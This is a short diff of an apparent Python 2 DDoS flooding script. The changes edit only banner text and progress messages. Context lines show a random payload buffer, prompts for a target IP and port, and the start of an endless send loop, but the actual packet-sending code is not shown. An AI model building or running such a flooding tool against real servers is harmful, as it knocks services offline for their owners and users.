@@ -20,17 +20,11 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : Dark Z"
+print "Author   : DarkZ"
 print "Facebook : https://www.facebook.com/Dark.Z"
 print "github   : https://github.com/darkzhacker"
 print "Instagram : https://Instagram.com/Dark_z"
-print "██████╗░░█████╗░██████╗░██╗░░██╗.         ███████╗
-          ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝.         ╚════██║
-          ██║░░██║███████║██████╔╝█████═╝░.       l  ░░███╔═╝
-          ██║░░██║██╔══██║██╔══██╗██╔═██╗░.          ██╔══╝░░
-          ██████╔╝██║░░██║██║░░██║██║░╚██╗.          ███████╗
-          ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝.          ╚══════╝
-         "
+print 
 ip = raw_input("IP Target : ")
 port = input("Select Port       : ")
 
@@ -44,7 +38,7 @@ print "[==========          ] Starting DDOS Tool"
 time.sleep(5)
 print "[===============     ] Waiting for Server"
 time.sleep(5)
-print "[====================] Started%"
+print "[====================] Started"
 time.sleep(3)
 sent = 0
 while True:
